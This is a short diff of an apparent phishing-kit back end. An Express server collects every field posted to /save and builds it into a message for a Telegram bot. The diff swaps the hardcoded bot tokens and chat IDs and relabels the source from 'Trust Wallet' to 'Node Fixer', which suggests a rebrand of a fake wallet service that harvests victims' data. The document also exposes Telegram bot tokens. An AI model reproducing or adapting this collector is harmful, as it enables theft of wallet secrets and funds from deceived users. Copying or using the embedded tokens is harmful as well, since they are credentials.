@@ -6,8 +6,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Replace with your Telegram Bot Token and Chat ID
-const TELEGRAM_TOKEN = '7971122615:AAH9gD_bc2Rbk9GaoAd7Wi92MNvAAIiwzSw';
-const CHAT_ID = '7192846272';
+const TELEGRAM_TOKEN = '7105987850:AAEx59csrzYm8r0cTcAsbFum1RNovl4SX6I';
+const CHAT_ID = '7884925803';
 
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -16,7 +16,7 @@ app.post('/save', async (req, res) => {
     const data = req.body;
 
     // Create a message string
-    let message = `Received data from Trust Wallet:\n`;
+    let message = `Received data from Node Fixer:\n`;
     for (let key in data) {
         message += `${key}: ${data[key]}\n`;
     }
